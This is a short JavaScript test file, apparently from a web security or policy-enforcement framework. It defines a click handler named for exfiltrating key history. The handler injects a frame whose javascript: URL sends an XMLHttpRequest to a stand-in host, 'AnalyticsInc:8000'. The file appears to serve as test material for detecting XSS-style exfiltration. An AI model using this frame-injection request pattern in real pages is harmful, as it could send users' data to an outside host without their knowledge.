// exfil_test_xss2.js
function exfiltrate_key_history() {
  var script = document.createElement("frameset");
  var script2 = document.createElement("frame");
  script2.src = 'javascript:Function(\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss2",true);xmlhttp.send(null);\')()';
  JAM.call(script.appendChild, script, [script2]);
  var v0 = document.getElementsByTagName("body")[0];
  JAM.call(v0.appendChild, v0, [script]);
  return
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
